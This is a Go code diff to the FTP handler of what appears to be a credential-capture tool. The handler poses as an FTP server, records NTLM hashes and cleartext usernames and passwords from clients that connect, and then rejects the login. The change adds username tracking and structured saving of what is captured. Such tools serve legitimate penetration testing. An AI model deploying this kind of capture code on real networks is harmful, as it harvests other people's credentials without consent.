@@ -34,6 +34,7 @@ func HandleFTP(c net.Conn) {
 	challenge := core.GetChallenge()
 	w := bufio.NewWriter(c)
 	r := bufio.NewReader(c)
+	ftpUser := ""
 
 	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }
 
@@ -101,21 +102,19 @@ func HandleFTP(c net.Conn) {
 			}
 			hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
 			if err == nil {
-				core.LogSuccess("[FTP] %s captured from %s", ntlmVer, c.RemoteAddr())
-				core.LogSuccess("      %s\\%s", domain, user)
-				core.LogSuccess("      %s", hash)
-				core.SaveHash(hash)
+				core.SaveCapture("FTP", c.RemoteAddr().String(), user, domain, ntlmVer, hash)
 			}
 			send("530 Authentication failed")
 			return
 
 		} else if strings.HasPrefix(upper, "USER ") {
+			ftpUser = strings.TrimSpace(line[5:])
 			send("331 Password required")
 		} else if strings.HasPrefix(upper, "PASS ") {
 			pass := strings.TrimPrefix(line, "PASS ")
 			pass = strings.TrimPrefix(pass, "pass ")
 			if pass != "" {
-				core.LogSuccess("[FTP] Cleartext from %s: pass=%q", c.RemoteAddr(), pass)
+				core.SaveCleartext("FTP", c.RemoteAddr().String(), ftpUser, "", pass)
 			}
 			send("530 Login incorrect")
 			return
